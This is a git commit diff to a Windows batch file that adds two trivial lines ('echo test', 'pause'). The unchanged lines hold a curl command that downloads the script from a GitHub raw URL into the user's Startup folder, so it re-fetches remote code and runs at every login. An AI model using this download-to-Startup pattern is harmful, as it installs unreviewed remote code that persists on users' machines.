0bee0a16ee11a08d3982da19af559019683b49d5
eamonhinton <neontechnologyimports@gmail.com>
2024-09-30 18:11:20 -0400

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,3 +1,5 @@
 REM DO NOT REMOVE -- UPDATE
 curl -o C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat https://raw.githubusercontent.com/eamonhinton/instruction-sets/main/main.bat
 REM DO NOT REMOVE -- UPDATE
+echo test
+pause
